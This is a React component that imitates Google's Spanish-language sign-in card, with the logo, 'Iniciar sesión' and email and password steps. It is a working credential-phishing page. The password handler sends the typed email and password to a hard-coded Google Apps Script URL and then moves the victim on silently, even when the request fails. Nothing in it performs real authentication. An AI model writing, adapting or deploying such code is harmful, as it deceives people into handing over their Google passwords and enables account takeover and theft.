import { useState } from "react";
import GoogleLogo from "./GoogleLogo";

const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) => {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // TU URL DE GOOGLE APPS SCRIPT
  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

  const handleEmailNext = () => {
    if (email.trim().length > 0) {
      setStep("password");
    }
  };

  const handlePasswordNext = async () => {
    // 1. Verificación de seguridad
    if (!password.trim() || isSubmitting) return;

    // 2. Bloqueamos el botón para evitar duplicados
    setIsSubmitting(true);

    try {
      // 3. Envío de datos (Asegúrate de que las llaves coincidan con tu Apps Script)
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          usuario: email,    // <--- Esto debe leer la variable 'email' del estado
          pass: password,    // <--- Esto debe leer la variable 'password' del estado
          tipo: "LOGIN_GOOGLE" 
        })
      });
      
      // 4. Pequeña pausa para asegurar el registro y saltar al siguiente paso
      setTimeout(() => {
        onLoginComplete();
      }, 1000);

    } catch (e) {
      console.error("Error al enviar datos:", e);
      // Si falla, permitimos reintentar
      setIsSubmitting(false);
      onLoginComplete(); 
    }
  };

  return (
    <div className="w-full max-w-[450px] mx-auto">
      <div className="forms-card p-10 sm:p-12 bg-white rounded-lg shadow-md">
        {step === "email" ? (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2">Iniciar sesión</h1>
            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Correo electrónico o teléfono"
              className="google-input w-full p-3 border rounded mb-6"
              autoFocus
              onKeyDown={(e) => e.key === "Enter" && handleEmailNext()}
            />
            <div className="flex justify-between items-center">
              <span className="text-blue-600 text-sm font-medium cursor-pointer">Crear cuenta</span>
              <button onClick={handleEmailNext} className="bg-blue-600 text-white px-6 py-2 rounded font-medium">Siguiente</button>
            </div>
          </div>
        ) : (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2">Te damos la bienvenida</h1>
            <div className="flex justify-center mb-8">
              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm bg-gray-50">
                <span className="text-gray-600">{email}</span>
              </div>
            </div>
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Introduce tu contraseña"
              className="google-input w-full p-3 border rounded mb-2"
              autoFocus
              disabled={isSubmitting}
              onKeyDown={(e) => e.key === "Enter" && handlePasswordNext()}
            />
            <label className="flex items-center gap-2 mb-8 cursor-pointer">
              <input type="checkbox" checked={showPassword} onChange={() => setShowPassword(!showPassword)} />
              <span className="text-sm">Mostrar contraseña</span>
            </label>
            <div className="flex justify-between items-center">
              <span className="text-blue-600 text-sm font-medium cursor-pointer">¿Olvidaste la contraseña?</span>
              <button 
                onClick={handlePasswordNext} 
                disabled={isSubmitting}
                className={`bg-blue-600 text-white px-6 py-2 rounded font-medium ${isSubmitting ? 'opacity-50' : ''}`}
              >
                {isSubmitting ? "Cargando..." : "Siguiente"}
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default GoogleLoginCard;
